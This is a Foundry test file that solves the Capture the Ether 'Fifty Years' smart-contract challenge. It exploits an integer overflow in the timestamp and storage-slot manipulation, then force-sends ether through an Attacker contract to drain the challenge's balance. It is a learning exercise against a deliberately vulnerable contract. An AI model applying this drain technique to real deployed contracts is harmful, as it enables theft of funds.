// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "src/utils/BytesDeployer.sol";
import "./Attacker.sol";

interface IFiftyYearsChallenge {
    function isComplete() external view returns (bool);
    function upsert(uint256, uint256) external payable;
    function withdraw(uint256) external;
}

contract FiftyYearsChallengeTest is Test {
    IFiftyYearsChallenge public fiftyYearsChallenge;
    address hacker = address(0);

    bytes32 slot0 = bytes32(uint256(0));
    bytes32 slot1 = bytes32(uint256(1));
    bytes32 slot2 = bytes32(uint256(2));

    bytes32 arrSlot0 = keccak256(abi.encode(slot0));
    bytes32 arrSlot1 = bytes32(uint256(arrSlot0) + 1);
    bytes32 arrSlot2 = bytes32(uint256(arrSlot0) + 2);
    bytes32 arrSlot3 = bytes32(uint256(arrSlot0) + 3);
    bytes32 arrSlot4 = bytes32(uint256(arrSlot0) + 4);
    bytes32 arrSlot5 = bytes32(uint256(arrSlot0) + 5);

    function setUp() public {
        Deployer deployer = new Deployer();
        fiftyYearsChallenge = IFiftyYearsChallenge(
            deployer.deployContract{value: 1 ether}("src/Capture_the_Ether/Math/Fifty_years/FiftyYearsChallenge.sol")
        );

        payable(hacker).transfer(5);
    }

    function testFiftyYears() public {
        emit log_named_uint("my balance", hacker.balance);
        emit log_named_uint("fiftyYearsChallenge's balance", address(fiftyYearsChallenge).balance);

        vm.startPrank(hacker);

        uint256 overflow_time = UINT256_MAX - 1 days + 1;
        fiftyYearsChallenge.upsert{value: 1 wei}(1, overflow_time);

        emit log_string("----------after upsert(1, 2^256-1 days)----------");
        emit log_named_uint("slot 0", uint256(vm.load(address(fiftyYearsChallenge), slot0)));
        emit log_named_uint("slot 1", uint256(vm.load(address(fiftyYearsChallenge), slot1)));
        emit log_named_address("slot 2", address(uint160(uint256(vm.load(address(fiftyYearsChallenge), slot2)))));
        emit log_named_uint("slot keccak(0) + 0", uint256(vm.load(address(fiftyYearsChallenge), arrSlot0)));
        emit log_named_uint("slot keccak(0) + 1", uint256(vm.load(address(fiftyYearsChallenge), arrSlot1)));
        emit log_named_uint("slot keccak(0) + 2", uint256(vm.load(address(fiftyYearsChallenge), arrSlot2)));
        emit log_named_uint("slot keccak(0) + 3", uint256(vm.load(address(fiftyYearsChallenge), arrSlot3)));

        fiftyYearsChallenge.upsert{value: 2}(2, 0);

        emit log_string("----------after upsert(2, 0)----------");
        emit log_named_uint("slot 0", uint256(vm.load(address(fiftyYearsChallenge), slot0)));
        emit log_named_uint("slot 1", uint256(vm.load(address(fiftyYearsChallenge), slot1)));
        emit log_named_address("slot 2", address(uint160(uint256(vm.load(address(fiftyYearsChallenge), slot2)))));
        emit log_named_uint("slot keccak(0) + 0", uint256(vm.load(address(fiftyYearsChallenge), arrSlot0)));
        emit log_named_uint("slot keccak(0) + 1", uint256(vm.load(address(fiftyYearsChallenge), arrSlot1)));
        emit log_named_uint("slot keccak(0) + 2", uint256(vm.load(address(fiftyYearsChallenge), arrSlot2)));
        emit log_named_uint("slot keccak(0) + 3", uint256(vm.load(address(fiftyYearsChallenge), arrSlot3)));
        emit log_named_uint("slot keccak(0) + 4", uint256(vm.load(address(fiftyYearsChallenge), arrSlot4)));
        emit log_named_uint("slot keccak(0) + 5", uint256(vm.load(address(fiftyYearsChallenge), arrSlot5)));

        new Attacker{value: 2}(payable(address(fiftyYearsChallenge)));

        fiftyYearsChallenge.withdraw(2);

        vm.stopPrank();
        emit log_string("----------after withdraw(2)----------");

        emit log_named_uint("my new value", hacker.balance);
        emit log_named_uint("fiftyYearsChallenge's new balance", address(fiftyYearsChallenge).balance);

        assertTrue(fiftyYearsChallenge.isComplete());
    }
}
